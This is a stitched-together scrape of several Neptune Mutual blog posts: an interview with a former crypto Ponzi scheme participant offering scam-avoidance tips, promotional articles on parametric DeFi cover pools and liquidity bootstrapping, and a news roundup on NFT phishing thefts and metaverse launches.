srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/how-to-avoid-crypto-scams-2.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/how-to-avoid-crypto-scams-2.png 1000w, https://blog.neptunemutual.com/content/images/2022/07/how-to-avoid-crypto-scams-2.png 1400w" sizes="(min-width: 720px) 720px"></figure><h3 id="q-how-did-the-scheme-affect-individuals-how-much-impact-can-one-exploit-create">Q: How did the scheme affect individuals? How much impact can one exploit create?</h3><p>Oh, it affects everyone involved. Mainly the victims, but it can affect the scammers too — depending on how much of a conscience they have, and how much money they are making. I have seen first-hand how money can warp your values and sense of right and wrong. Unlike a blackhat hack where an individual steals crypto, this type of Ponzi scheme is bad because it incentivizes the whole community to behave in a selfish and self-serving way at the expense of others. This type of scheme is a sickness to society and a contagious one at that. It’s also hard to heal from, even after you’ve stopped, because of the realization of how many people have been badly affected, or infected, so to speak.</p><p>As a scammer, it affects you mentally. As I said, it screws up your value system. Right from the start, I knew it was wrong, but those who invited me presented it as a no-risk offer with a huge upside. They flattered me by telling me how good I was at closing deals, and they told me how much money I could make if I joined them. At first, it was sort of an adrenaline rush, a Wolf of Wall Street kind of thing. Heck, it was easy money paid for by a few chats here and there. And of course, one thing led to another, and before long I was part of the team masterminding a huge scam. I think when people say the “wrong side of the law”, it sounds like a very binary choice, which in some sense of course it is, but what I want to say is that my journey started off with a choice that didn’t seem that unreasonable to me at the time — introducing a few people to a risky project in a risky industry where some people get lucky and some don’t. Others had their opportunity to get rich, and life’s not fair. This was my chance. That was what I told myself anyway.</p><p>But, anyway, the most affected individuals are not the scammers, it’s the victims. They are the ones who are affected most, those whose hard-earned money got swiped away from their hands.</p><p>It was really only towards the very end of the project I realized just how out of hand the whole thing had become, and how many people were being badly affected. It is something I’ll take with me and that I have to deal with. Of course, now I want to make up for the wrong that I’ve done but obviously, that’s too late for those that were directly impacted. The guilt and shame are hard to face up to.</p><p>Being here and sharing my story with you and disclosing how to avoid exploits is one way that hopefully I can do some good.</p><p>As a bystander, hacking and exploitation incidents appear to be just unfortunate events where money was lost. In truth, it’s actually more than that.</p><h3 id="q-what-changed-your-mind-and-made-you-stop-what-you-were-doing-were-you-able-to-return-any-of-the-victims%E2%80%99-money">Q: What changed your mind and made you stop what you were doing? Were you able to return any of the victims’ money?</h3><p>Circumstance. The seriousness and scale of the situation we got ourselves into changed my mind. The nature of the scheme, where we were encouraging others to grow the scam, meant that it got out of control.</p><p>As for me, it was when public authorities started to take notice and warn about the project that I got scared of the consequences of what we had done. It opened my eyes. True, not everyone would react like this. But, it certainly had an effect on me.</p><p>I repaid losses to those people that I knew and had onboarded. The nature of the flow of payments in the scheme and the scale of the losses meant that I wasn’t able to do a great deal financially to make good those that had lost money.</p><h3 id="q-what-repercussions-do-exploiters-face-when-caught-doing-hacks-and-scams">Q: What repercussions do exploiters face when caught doing hacks and scams?</h3><p>It really depends on where the hackers and scammers are based as well as the specifics of what they have done. Laws are different in every country and each government takes a different approach. Authorities and regulators are becoming much more sophisticated, and whilst the blockchain is anonymous, it is transparent as transactions can be followed.</p><p>At the end of the day, whether individuals are hacking wallets or exchanges or robbing a bank, the end result is the same. The same is true of a Ponzi scheme whether it is on or off-chain. As to the consequences, I am not an expert, but I imagine that for those that get caught the penalties or sentences would be much the same as for a traditional crime. Hiding behind an impersonal computer screen might make hackers feel more distant from the crime and their victims, but when they are caught I don’t think legal systems treat hackers any differently than other criminals.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/07/how-to-avoid-crypto-scams-3.png" class="kg-image" alt="" loading="lazy" width="1400" height="700" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/how-to-avoid-crypto-scams-3.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/how-to-avoid-crypto-scams-3.png 1000w, https://blog.neptunemutual.com/content/images/2022/07/how-to-avoid-crypto-scams-3.png 1400w" sizes="(min-width: 720px) 720px"></figure><h2 id="how-to-spot-a-scam">How to Spot A Scam</h2><h3 id="q-what-are-the-usual-signs-of-a-scam">Q: What are the usual signs of a scam?</h3><ol><li><strong><strong>Scams usually press on your life’s pain points such as your fears and worries. </strong></strong>I think almost everyone in the crypto space knows what FOMO is. Sharing the same knowledge, if not greater, hackers and scammers take advantage of many people’s fear of being left out, not getting on the “next moon project”, or this once-in-a-lifetime opportunity. They’ll push undesirable outcomes like not accomplishing your financial goals, growing old poor, and any insecurity they can find.</li><li><strong><strong>They pressure their target victims with a sense of urgency. </strong></strong>Scammers make you hurry, respond quickly, and/or send money as soon as possible. They’ll make you feel like the opportunity they’re presenting is going away very soon when it’s not. They’ll try to overwhelm and detach you from your logical train of thought so you won’t realize they’re exploiting you.</li><li><strong><strong>They promise quick results. </strong></strong>There’s no such thing as quick and easy money. Not everyone knows this but even if they do, some still fall victim to temptation. Scammers tend to promise their victims they’ll double their money to the thousands and millions in a matter of months, weeks, or days — provided you give them money first. Temptation is a powerful tool. If it’s too good to be true, it probably is.</li><li><strong><strong>They generally ask you to give money upfront or a “buy-in” investment. </strong></strong>Exploiters like to throw around financial buzzwords like investment, capital, or professional, just to name a few, to make themselves sound trustworthy to send money to. Research and find out if what they’re saying is true or if there’s information or reports online that mention scams or hacks with similar methods.</li><li><strong><strong>They ask for personal information.</strong></strong> Private and confidential info like your phone number, email address, bank account number, and most especially, your password are some of the things you should never reveal to any stranger, whatever they say, under any circumstances. No crypto exchange, nor any reliable project would ask you for this kind of information through conversation channels, if at all. KYC should of course be expected for CeFi exchanges, but private and confidential information is not requested. Be cautious and wary of the website you are looking at, some hackers use fake websites for phishing.</li></ol><h3 id="q-so-you%E2%80%99ve-been-part-of-one-scam-do-you-think-what-you%E2%80%99ve-shared-here-today-still-applies-to-other-exploits">Q: So you’ve been part of one scam. Do you think what you’ve shared here today still applies to other exploits?</h3><p>Yes, absolutely. Many scams, hacks, and exploits use similar tactics and elements.

Do your own research.</strong></strong> Find out everything you can about opportunities you encounter or presented to you. Search government records if they’re a registered business or regulated organization. Research the team behind the project. Are they credible within the industry? Are they transparent and easy to locate? Analyze and discover what the project intends to solve. Do they have real-world utility? Is the project functional? How is it beneficial? Get information about their revenue sources. How do they make money? What products or services do they offer? If they’re a stranger, be super cautious about what they tell you. A sweet deal without any catch usually takes something more in return. If it’s someone you know, ask them the following questions: What’s your role within the company? How do you make a profit out of this? What’s the product/service I’m investing in?</li><li><strong><strong>If they’ll ask you to give money upfront, think twice about joining. </strong></strong>Yes, investments involve “investing money”. Credible investments usually don’t make you pay upfront. Also, look into their financials or news about them to understand their growth rate and how they scale the business.</li><li><strong><strong>Don’t rush into things especially when investing in a new project.</strong></strong>Consider several factors first such as their goals, revenue sources, team, investors, partners, and presence in the industry. Above all, take your time.</li><li><strong><strong>Protect your personal information. </strong></strong>Keep confidential data secure and private. The use of authentication devices like Yubikey or password managers are highly recommended when dealing with valuable information. Practice <a href="https://uk.norton.com/internetsecurity-how-to-8-ways-to-protect-your-private-information-online.html" rel="nofollow noopener noreferrer">safe browsing</a> and <a href="https://www.security.org/crypto/protection/" rel="nofollow noopener noreferrer">digital asset security</a> methods as well to avoid exposing your data to potential hackers and scammers.</li></ol><h2 id="more-ways-to-prevent-crypto-exploits">More Ways to Prevent Crypto Exploits</h2><ol><li>Never click links on a Discord channel or DMs about unannounced “stealth mints.” Unless a project says it will do a stealth mint, it’s a scam.</li><li>Never trust announcements that play on the fear of missing out or FOMO.</li><li>Only visit links in official Discord announcement channels. Even then, take extra precautions.</li><li>Don’t trust Discord bot announcements. Founders or admins typically make important announcements personally.</li><li>Disable members’ DMs. Discord’s Privacy &amp; Safety settings have this option.</li><li>Double-check username handles and account details when transferring admin/moderator ownership to other members of your team.</li><li>Be wary of sudden situations that require money — genuine events are frequently advertised in advance to prepare users.</li><li>Always check on the exact spelling, and domain of a web address that you interact with — there are over 1,500 top-level domain names, thus a fraud may be performed from any version of a recognizable web address.</li><li>Cross-check the credibility of any token offering by checking the official Twitter, Telegram, Discord, and website. If something is only communicated through one channel, you would be right to be skeptical.</li><li>Contact the official account of a team member (Google Chat) or reach out over call if you have any questions.</li><li>Encourage a platform to have open communication with other community members if they have spotted a problem.</li></ol><h2 id="takeaway">Takeaway</h2><p>Hacks and exploits in the crypto and DeFi space are highly prevalent.

        html: '<p>Incidents in the DeFi space happen, and when they do, they can cause serious financial damage. Neptune Mutual’s marketplace allows DeFi, CeFi and metaverse projects to create cover pools with parametric cover policies that protect digital assets and are designed to meet the needs of their own project and community.</p><p>The crisis in crypto markets has many DeFi projects asking themselves, how can we help protect our community, and how can we bootstrap the liquidity to do this? To answer this question, it is helpful to understand the perspective of those who can provide liquidity who may ask: <strong><strong>Why should I invest my liquidity in your cover pool?</strong></strong></p><p>In our blog <a href="https://blog.neptunemutual.com/dont-be-a-salmon-in-a-bear-market/" rel="follow">Don’t Be a Salmon in a Bear Market</a>, we covered the importance of risk and return, and how investors need to understand both the risks they are taking as well as how their returns are generated. Investors should ask, “What are the risks (probability and impact) that my liquidity will be underwriting in this cover pool?” And of course, investors will want to know about the returns they might expect for providing this liquidity. The final question investors need to answer is, how well does the risk/return opportunity of providing liquidity compare with other investment options?</p><h3 id="understanding-risks">Understanding Risks</h3><p>Information and data analysis plays an integral part in understanding and predicting risks and returns. In the traditional world of insurance and banking this is so true that they created a specific term for it, actuarial science:</p><p><em><em>Actuarial science is the discipline that applies mathematical and statistical methods to assess risk in insurance, finance, and other industries.</em></em></p><p>In the case of the blockchain industry, it is still so young that there isn’t enough historical data to develop statistically reliable blockchain risk pricing models.</p><p>Fortunately, there are “reference points” that can be used to benchmark project risks. What’s clear though is that there is an information asymmetry between those that create and manage blockchain projects and those that provide liquidity for underwriting blockchain project risks.</p><p>The role of cover creators, and Neptune Mutual which provides the marketplace infrastructure, is to help all stakeholders develop their understanding of hack and exploit risks, and above all to provide an effective and reliable means of mitigating these risks. This leads to the first and probably most important aspect of bootstrapping liquidity: <strong><strong>effective communication that builds trust in a community’s security measures.</strong></strong></p><p>When it comes to blockchain projects and smart contracts, one of the most fundamental attributes of these systems is that they do away with the need for trust: “trustless” is no doubt a term that you have seen regularly in relation to blockchain projects. It is therefore ironic that trust plays such an important role in convincing liquidity providers that your project security is resilient to cyber threats, and that providing liquidity to your cover pool is a good opportunity. <strong><strong>The key to bootstrapping liquidity is to build trust in the security of your project</strong></strong>. If you are leading a CeFi, DeFi, or metaverse project then the process of creating a cover pool for your community provides an ideal forum to create a connection with your community in relation to security, protection of digital assets, and responsible investment. This should help drive engagement, attract new members and grow your community.</p><h3 id="transparency-promotes-trustworthiness">Transparency promotes trustworthiness</h3><p>One of the most obvious ways to make a project more trustworthy is by being transparent. Projects in the DeFi space often tend towards anonymity and secrecy; there may, of course, be good reasons for this, but it does make it more difficult to develop a relationship of trust if the community has no visibility of who they are trusting.</p><p>Transparency in relation to the project team means the community can more easily identify with, and above all hold accountable, the individuals of the team. Nonetheless, for DeFi teams that wish to remain anonymous Neptune Mutual can go some way to helping build trust by KYCing the cover creator team; this way the Neptunite and project community can be sure that the cover creator/project team can be held individually responsible (as their identity is known by the Neptune Mutual leadership team), despite remaining anonymous to the wider community.</p><p>At Neptune Mutual, we try to live by our recommendations, and so our team is clearly identified on our project <a href="https://neptunemutual.com/" rel="follow">website</a>’s front page, making it easy for everyone to know who we are, and to hold us responsible for our actions.</p><p>Transparency also carries over into code. How secure a project is depends, in large part, on the quality of the code. While it is true that many liquidity providers are not typically well versed in assessing solidity code, front-end code, or other attack vectors, it seems a reasonable assumption that those projects with an open-source code repository will be more open, transparent, and confident in the robustness of their code in protecting against technical risks. In other words, the more open a project is, the better chance it has of being secure. This point deserves emphasis since cover creators are asking liquidity providers to underwrite security vulnerabilities, and liquidity providers can legitimately ask how they can assess this risk if the code is hidden behind a virtual wall.</p><p>As mentioned, we try to lead by example and the Neptune Mutual code can be seen in our project’s <a href="https://github.com/neptune-mutual-blue/protocol" rel="nofollow noopener noreferrer">Github repository</a>.</p><h3 id="bootstrapping-cover-pool-liquidity-leading-by-example-and-building-resilience">Bootstrapping cover pool liquidity: Leading by example and building resilience</h3><p>If cover creators are hoping to encourage liquidity providers (LPs) to underwrite security risks in their projects, it stands to reason that LPs expect cover creators to inject some initial liquidity into their own cover pool. This is where the idea of “walking the talk” comes in; by doing so, it will encourage LPs to do the same.</p><p>Cover creators need to be aware that protecting their project communities requires more than completing one or more smart contract audits. It’s about taking proactive measures, including providing initial liquidity and showing through different ways how committed the project is towards digital asset protection.</p><h3 id="reassuring-your-lp-community">Reassuring your LP community</h3><p>One of the four design principles that we used in creating the cover pool marketplace is minimising risk for stakeholders; all four principles are discussed in our recent <a href="https://blog.neptunemutual.com/be-aware-of-the-bear-crypto-crash-heightens-awareness-of-risks-hacks-but-is-this-enough-to-drive-mainstream-adoption-of-digital-asset-protection/" rel="follow">blog</a>. This principle led us to the idea of the reassurance pool. The reassurance pool reduces risk to LPs by re-capitalising the liquidity pool in the event that an incident arises (assuming it is validated by the community and the cover pool pays out to policyholders). Recapitalisation of the cover pool by the reassurance pool can be made up to 25% of the loss suffered by the cover pool. Cover creators that fund a reassurance pool will lower the risk exposure of LPs and will therefore find it correspondingly easier to attract and bootstrap liquidity from their community and from the Neptunite community.</p><h3 id="the-neptunite-community">The Neptunite Community</h3><p>As a cover creator, you will need to communicate the benefits of your cover pool to your community. To help create a more accessible platform, we have designed a feature where cover creators can request assistance to bootstrap liquidity. <a href="https://docs.neptunemutual.com/" rel="follow">Visit the bond section</a> to see the details of this application process for cover creators.</p><p>The idea is to engage and empower the Neptunite community. Only projects that can demonstrate a complete commitment to existing and ongoing security excellence will receive liquidity assistance, and this is yet another way of providing confidence to the liquidity provider community that the cover pool is worth considering.</p><p>The importance of a staking pool cannot be understated for those who are serious about bootstrapping liquidity. Cover creators should carefully consider it while looking to activate the NPM community and <a href="https://www.youtube.com/watch?v=5Vq2k2UanNc" rel="nofollow noopener noreferrer">realise the advantages of Neptune Mutual’s staking pool feature</a>.</p><h3 id="returns-and-protection-from-crypto-price-volatility">Returns and protection from crypto price volatility</h3><p>Stablecoins are a popular way to keep your cryptocurrency safe, but it’s important that you know the risks associated with them. In our last two articles on Medium about <a href="https://blog.neptunemutual.com/capital-requirement-how-to-measure-it-and-why-it-matters-a-lot/" rel="follow">Capital Requirements</a> and <a href="https://blog.neptunemutual.com/be-aware-of-the-bear-crypto-crash-heightens-awareness-of-risks-hacks-but-is-this-enough-to-drive-mainstream-adoption-of-digital-asset-protection/" rel="follow">Widespread Adoption of Financial Protection</a>, we discussed how APYs that incorporate tokens can be misleading because they ignore potentially large changes in the value of both the principal (the amount deposited) as well as the value of the additional tokens (irrespective of how many new tokens you actually receive): it the token value drops significantly this can lead to a situation where investors make an overall loss in dollar terms even when achieving very positive APY token returns.</p><p>In the Neptune Mutual marketplace, <strong><strong>returns for liquidity providers are transparent</strong></strong>, because liquidity is provided in stablecoins and returns are paid in stablecoins; in this way, LP returns are insulated from variations in token prices. In addition, the amount of liquidity in the pools is insulated from token price volatility and this is just one of the reasons that policyholders can be confident there will always be sufficient liquidity to pay all policyholders in the event of an incident.</p><p>For those readers who have used our <a href="http://test.neptunemutual.com/" rel="follow">testnet application</a>, you’ll see that whilst policyholder fees are the most prominent source of LP returns, there are quite a number of others. Firstly, some of the pool’s excess liquidity is used to generate returns through automated investment strategies in select lending protocols like Compound and Aave. In addition, cover pool liquidity can be used for flash loan lending that generates income for the pool and hence returns for LPs.</p><h3 id="pod-staking">POD staking</h3><p>The POD staking mechanism allows projects to provide an additional return to LPs over and above that indicated in the cover pool card in the Neptune Mutual application. POD staking returns take the form of project native tokens. This additional return is not included in the standard cover pool LP APY calculation. Take a detailed look at <a href="https://www.youtube.com/watch?v=fMOSGCLNIco" rel="nofollow noopener noreferrer">how POD staking works</a> and find out its importance in bootstrapping cover pool liquidity.</p><h3 id="bootstrapping-conclusion">Bootstrapping conclusion</h3><p>In this uncertain time, it’s more important than ever to build trust with your community. By following these liquidity bootstrapping guidelines we hope that cover creators can build resilience, improve project security and offer a reliable solution to their community to protect digital assets. We hope you’ll join us in our mission to cover, protect, and secure on-chain digital assets.</p><hr><h3 id="about-us">About Us</h3><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p>One of the principal reasons for widespread adoption of Amazon’s marketplace is convenience: fast search and comparison of products, fast purchase (one-click), fast delivery (same-day in many countries), and reliable service (Amazon’s A-to-Z guarantee).</p><p>Uber, AirBnB and many other success stories have utilised a similar mix of ingredients that make their solutions convenient.</p><p>In the retail banking sector the rise of neobanks, such as Revolut, has re-defined convenience: fast transactions (typically a few seconds, as opposed to days), mobile phone banking meets UI (user interface) design, fast and real online chat help (OMG what? … yes honestly, no more talking with answerphones!).</p><p>OK, so how convenient is crypto? (Possibly the subject of another article, let us know in the comments below if you’d like this) For now, let’s stick to how can we make financial protection convenient?</p><p>At Neptune Mutual, everything we create follows the four core design principles:</p><ol><li>Maximise <strong><strong>security</strong></strong></li><li>Minimise <strong><strong>risk</strong></strong></li><li>Maximise <strong><strong>scalability</strong></strong></li><li>Maximise <strong><strong>user experience (UX)</strong></strong></li></ol><p>This is our “secret source” to making financial protection convenient and accessible.</p><h2 id="maximise-security">Maximise Security</h2><p>This isn’t just a maxim. It is the DNA of Neptune Mutual’s culture. It is our mission to cover, secure, and protect against hacks and exploits. Therefore, it is crucial that we ourselves do everything possible to be as secure as possible.</p><p>Security matters to us, and it should matter to you. One of the mantras, and underlying values of blockchain systems, is that they are trustless. So we think that it would be odd for us to say “trust us” that we are doing a good job of securing our application, whilst at the same time hiding the means for users to do their own research. Neptune Mutual is one of the few cover protocols that have a trustless or more precisely, open-source protocol. Anyone can review our bespoke (non-forked) <a href="https://github.com/neptune-mutual-blue/protocol" rel="nofollow noopener noreferrer">code</a>. We believe this is the standard that blockchain users should expect.</p><h2 id="minimise-risk">Minimise Risk</h2><p>We have gone to great lengths to review every detail of our marketplace design to minimise risks. We have completely removed any token/crypto market price volatility from the marketplace model. Firstly, it shouldn’t be a surprise to anyone that there is significant price volatility in the crypto market.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.neptunemutual.com/content/images/2022/07/crypto-vi.png" class="kg-image" alt="" loading="lazy" width="1200" height="908" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/crypto-vi.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/crypto-vi.png 1000w, https://blog.neptunemutual.com/content/images/2022/07/crypto-vi.png 1200w" sizes="(min-width: 720px) 720px"><figcaption><strong><em>Crypto Volatility Index Chart | Source: </em></strong><a href="https://www.investing.com/indices/crypto-volatility-index-chart" rel="nofollow noopener noreferrer"><strong><em>investing.com</em></strong></a></figcaption></figure><p>Secondly, when protocol APY returns are driven by tokens, the impact of the change in the price of the token can significantly outweigh the APY “returns” of additional tokens; put another way, you can get a 1000% APY whilst at the same time ending up with a lower principal and lower total funds in dollar value than you started with i.e. you made a loss.</p><p>At Neptune Mutual, we minimise risk to both liquidity providers and policyholders by insulating both parties from any token/crypto price volatility. This is done through the use of stablecoin liquidity in cover pools and stablecoin payouts to policyholders.</p><p>Furthermore, there is a 100% minimum capital requirement for cover pools so that we can, with 100% confidence, guarantee that cover policyholders will receive a payout in the event of an incident. If you would like to know more about this important subject, and how our approach differs from other protocols you might like to read it <a href="https://blog.neptunemutual.com/capital-requirement-how-to-measure-it-and-why-it-matters-a-lot/" rel="follow">here</a>.</p><p>Of course, there are many other aspects to minimising risk which we will no doubt write further about.</p><h2 id="maximise-scalability">Maximise Scalability</h2><p>When hacks and exploits occur, the consequences can affect a lot of people or wallets. Convenience means resolving these consequences fast.</p><p>So, when designing a cover solution Neptune Mutual adopted a parametric solution.</p><p>What does this mean?</p><p>It means that by assessing the incident, rather than individual claims, the Neptune Mutual solution is scalable in the sense that it takes the same amount of time (set by the cover creator and usually 7 days) to resolve an incident, irrespective of the number of people or wallets affected.</p><p>Imagine a hack where you are one of 20,000 people that have been affected. What does that look like for protocols that need to assess 20,000 individual claim assessments … Well, we drew 20,000 faces to give you an idea of what it looks like. Resolving all these individual assessments would inevitably take a lot of time.</p><p>This is why parametric covers are so convenient for CeFi, DeFi, and Metaverse communities because by simply focusing on the event instead of individuals, digital asset protection can scale to cover as many people or wallets as the cover pool liquidity will allow, whilst maintaining a quick (7-day) period for assessing everything that parametric cover needs to resolve the situation.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/07/20K-claim-assessment.png" class="kg-image" alt="" loading="lazy" width="1136" height="635" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/20K-claim-assessment.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/20K-claim-assessment.png 1000w, https://blog.neptunemutual.com/content/images/2022/07/20K-claim-assessment.png 1136w" sizes="(min-width: 720px) 720px"></figure><h2 id="maximise-user-experience-ux">Maximise User Experience (UX)</h2><p>User experience optimization is critical especially since the blockchain ecosystem is relatively nascent and full of technical jargon. The average potential user does not know what dApp means, nor do they have any clear understanding of how a smart contract works.</p><p>But the thing is they shouldn’t have to learn about all the underlying technology just to access the digital asset protection services that they need.</p><p>At Neptune Mutual, we’ve made our cover protocol as user-friendly as possible. Whether you’re purchasing a cover policy, providing liquidity to cover pools, or reporting a trigger incident, we’ve made sure every step of the process is straightforward.

Put simply, payouts are made according to predefined parameters.</p><p>In this way, it offers a means of guaranteeing payouts after a qualifying event has been validated.</p><p>There are two foundational elements in any parametric cover model:</p><h3 id="risks-to-be-covered">Risk(s) To Be Covered</h3><p>Like the discretionary model, parametric cover is designed to mitigate security risks that significantly impact digital assets. The difference here is that parametric cover determines risk using predefined parameters, meaning the specific risk(s) being covered in the policy have been pre-established in the contract.</p><h3 id="threshold-level">Threshold Level</h3><p>A threshold level is a parameter that determines the size of the hack or incident that qualifies the security breach as a trigger event.</p><p>All the parameters required to trigger an event are predefined in the policy, so it’s a simple matter of validating their occurrence by the NPM community, following which payout is guaranteed for all policyholders.</p><h2 id="what-makes-parametric-cover-convenient">What Makes Parametric Cover Convenient?</h2><p>Deployed for risk mitigation, the convenience that parametric cover protocols provide is immediately clear. For one, it provides certainty — there’s no risk of your claim being denied after the community has validated that the parameters of a policy have been triggered. Policyholders also know how much they will receive once resolution has been reached on the incident.</p><p>Other benefits include:</p><h3 id="quicker-claims-processing">Quicker Claims Processing</h3><p>Because it is the event that is assessed, and not individual loss, the claims process is a lot faster. There’s no lengthy loss adjustment process or time-consuming investigations, as we have seen in the example above about the 20,000 user wallets affected.</p><p>In this way, parametric covers can cut down the claims processing time from a few weeks or even months to a few days.</p><h3 id="guaranteed-payouts">Guaranteed Payouts</h3><p>Incident validation is also streamlined and usually follows a simple binary decision rule. NPM token holders report and vote on whether an incident has triggered policy parameters. Once an incident has been validated, all policyholders are guaranteed that their claim will be paid out.</p><p>Policyholders can be confident in this guarantee given the low risk 100% minimum stablecoin capital requirement of the cover pools, as already mentioned.</p><h3 id="tailor-made-cover-policies">Tailor-Made Cover Policies</h3><p>In the Neptune Mutual marketplace, cover pools are created by projects, and therefore tailor-made specifically to match the requirements of the community of that project.</p><h2 id="what-policy-should-i-get-for-my-digital-assets">What Policy Should I Get For My Digital Assets?</h2><p>Imagine suffering a loss and expecting compensation from your policy, only to be told that the loss was never covered from the start.</p><p>When there is a mismatch in understanding between the policyholder and the insurer as to the scope of the policy, the outcome of the process is likely to be disputed, or at the very least, leave one side feeling aggrieved.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/07/six-nine.png" class="kg-image" alt="" loading="lazy" width="1400" height="1171" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/six-nine.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/six-nine.png 1000w, https://blog.neptunemutual.com/content/images/2022/07/six-nine.png 1400w" sizes="(min-width: 720px) 720px"></figure><p>The nature of parametric cover is that it generally covers a much wider range of risks and has a few sets of exclusions.</p><p>So armed with the knowledge that understanding precisely which cyber risks are included, and those which are excluded, by a cover policy leads to the question: How do I find the right cover policy for a specific digital asset that I hold in a particular DeFi, CeFi or Metaverse project?</p><p>We believe that our marketplace will be a convenient search engine to help users find cover policies tailored by projects for their communities. Neptune Mutual is a community-centric project, and over 20k of our community helped us refine the user interface (UI) of our application following its launch on the Polygon Mumbai testnet: have a look <a href="https://blog.neptunemutual.com/announcing-the-testnet-winners/" rel="follow">here</a> at the blog we wrote about the winners of our testnet competition.</p><h2 id="neptune-mutual-cover-marketplace">Neptune Mutual Cover Marketplace</h2><p>Neptune Mutual is designed to be a convenient and reliable marketplace for parametric cover policy purchasers.</p><p>First, policies are designed by cover creators to meet the needs of their own specific projects. This way, policyholders get the appropriate cover from the project itself. Not only does this save time, but it also solves the problem of having to compare different policies to find one best suited to cover the risks of a specific blockchain project.</p><p>Underwriting capital is funded through dedicated liquidity cover pools using stablecoin. This makes the marketplace completely independent and removed from crypto market and token price volatility and also helps ensure that there is always sufficient liquidity to cover validated payouts.</p><p>Lastly, where cover creators have integrated Neptune Mutual’s SDK, policy purchasers can access the Neptune Mutual cover marketplace directly from project or exchange applications. Choose the type of cover you need and duration and you’re good to go. It’s really that quick and painless.</p><h2 id="promoting-mainstream-adoption-of-digital-asset-protection">Promoting Mainstream Adoption of Digital Asset Protection</h2><p>Convenience is equally as important as awareness when it comes to adopting digital asset protection in blockchain, perhaps even more so.</p><p>At Neptune Mutual, our aim is to drive the adoption of digital asset protection by making parametric cover solutions reliable, fast, secure, and of course, convenient. We have rigorously employed our four design principles to optimise every aspect of the protocol in terms of security, risk, scalability, and UI.</p><p>Finally, we are guided by our Neptune Mutual community, whom we serve. We invite you to join us and contribute to, our mission to cover, protect and secure digital assets.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

The trading volume of NFTs is expected to reach $147 billion by 2026, up from the current trading volume of $17 billion in 2021. Beyond NFTs, the metaverse is often seen as an extension of one’s online experience. However, the metaverse is frequently used to access new experiences, such as watching a playoff game through a glass wall, staying in a celebrity-level luxury resort, and traveling to distant solar systems. With virtual reality development well underway, it is only a matter of time before these previously unattainable experiences become a reality for the average person.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>Beeple, a well-known Twitter handle for digital artist Mike Winkelmann and artist of one of the most expensive NFTs ever sold — Everydays: The First 5000 Days, was reportedly the victim of a phishing scam that stole $438,000 worth of cryptocurrencies in the process. The hacked account featured a phishing link to a dubious website that pretended to be a raffle for Beeple’s collaboration with Louis Vuitton. According to Harry Denley, a security expert at cryptocurrency wallet MetaMask, one Ethereum is automatically drained once users connect their wallets. A second phishing domain with an advertisement claiming Beeple is giving away 200 unique works of art was also tweeted by the malicious parties involved. For a total of about $72,000, the first scam netted 36 Ethereum, while the second scam netted about $366,000 worth of Ethereum, WETH, and NFTs.</p><p>A phishing attack against DigitalOrnithologist on Tuesday resulted in the theft of 29 Moonbirds valued at around $1.5 million. The victim lost their NFTs after clicking on a phishing link given by a scammer. Tweets from a Twitter user who claims to know the perpetrator provided screenshots of both the account and the website that the hacker had used to steal NFTs. The Twitter account of the alleged hacker has been deleted.</p><h2 id="metaverse-and-nfts">Metaverse and NFTs</h2><p>With a series of tokenized collectibles featuring National Hockey League legend Wayne Gretzky, eBay has officially launched its first NFT drop. The NFT collection comes in four different rarity tiers: green (299 editions), gold (199), platinum (99), and diamond (15), all of which depict animated versions of Gretzky inspired by Sports Illustrated magazine covers. The collection went on sale on eBay’s marketplace on Monday, but the limited-edition diamond, platinum, and gold tiers, each worth $1,500, $100, and $25, have already sold out.<br><br>In a move into the realm of cryptocurrency, GameStop has unveiled its own NFT-enabled blockchain wallet. The GameStop Wallet will allow gamers to acquire, send, and store Ether, ERC-20 tokens, and NFTs via a browser extension that runs on the Ethereum network, using Ethereum’s Loopring layer-2 scaling technology for decentralized exchanges. Leveraging the Chrome Web Store, users can download and install the wallet extension. GameStop Wallet, like MetaMask’s Chrome extension, will integrate with its NFT marketplace when it launches in the second quarter of its fiscal year.<br><br>Oracle Red Bull Racing has released Monaco Grand Prix NFTs on the Tezos blockchain and are now available on the Bybit NFT marketplace. The F1 team hopes that this second series of digital collectibles will connect fans to the team and various memorable moments through a series of limited edition pieces. A one-of-a-kind Monaco-edition Playseat simulator rig was on display, and it saw some racing action with drivers and Red Bull Athletes during the recent weekend’s race. At the same time, an NFT auction was taking place, with the highest bidder receiving both a digital version of the one-of-a-kind seat for their memorabilia collection as well as the right to claim the actual one-of-a-kind Playseat from the Monaco Energy Station.<br><br>Players have been raving about Planet Sandbox, a free-to-play shooting sandbox game, because of its unique gameplay and several ways to make money. According to recent developments, Planet Sandbox intends to launch its marketplace and dApp in Q3 2022. Staking, Dashboard, and Inventory are just a few of the exciting new features coming to the dApp, along with a native marketplace that will allow users to buy and sell NFTs directly in-game.<br><br>Gucci has unveiled its latest Roblox virtual space, Gucci Town. Gucci Town is an extension of creative director Alessandro Michele’s virtual vision of the brand, and it includes a piazza that connects different areas. Players can walk from the central piazza to Mini Game Heights, where they can compete in Gucci games like Tile Takeover or Flashlight Tag to earn GG Gems, the in-game currency of Gucci Town. There is also the Creative Corner, where users can create their own artworks or learn about the works of a visiting artist. Users can also visit Vault Plaza, an exhibition space that features some of Gucci’s most recent collaborations and releases. The first collection of Gucci Shop items will be available until June 17, with a new limited-edition Gucci Blondie bag released each week.<br><br>After announcing a collaboration with Clancy International to launch video NFTs, the Turkish Airlines EuroLeague is poised to expand its Web3 initiative. The announcement comes at the back of Europe’s top-tier basketball club competition’s earlier launch of EuroLeague Land. The 18th of May saw the introduction of EuroLeague Land, a metaverse realm that allows fans to experience the 2022 